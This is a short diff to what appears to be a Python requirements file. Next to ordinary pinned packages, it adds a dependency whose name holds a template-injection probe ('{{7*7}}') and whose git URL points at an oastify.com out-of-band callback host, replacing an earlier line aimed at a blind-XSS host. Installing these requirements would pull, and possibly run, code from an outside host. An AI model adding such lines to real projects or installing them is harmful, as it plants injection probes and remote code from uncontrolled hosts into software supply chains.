@@ -2,4 +2,4 @@
 colorama==0.4.3
 win_unicode_console==0.5
 #snyk-peak @ git+https://github.com/rreissdorker/snyk-peak@main
-dummybxss @ git+https://bxss.r0l.me/dummybxss
+dummybxss2{{7*7}} @ git+https://ao2ypb0g7vq3djfd3zzsy9o62x8owfn3c.oastify.com/dummybxss2
